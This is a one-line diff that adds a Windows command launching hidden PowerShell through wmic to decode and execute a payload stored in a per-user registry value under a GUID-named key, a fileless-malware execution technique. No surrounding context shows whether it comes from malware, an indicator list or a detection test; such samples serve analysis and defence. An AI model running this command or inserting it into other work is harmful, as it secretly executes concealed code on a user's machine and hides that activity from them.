@@ -1,0 +1,1 @@
+C:\Windows\system32\wbem\wmic.exe /output:clipboard process call create "powershell -w hidden iex([System.Text.Encoding]::ASCII.GetString((get-itemproperty 'HKCU:\Software\AppDataLow\Software\Microsoft\EEA07150-75F3-50EE-6F02-79841356BDF8').Appopc64))"
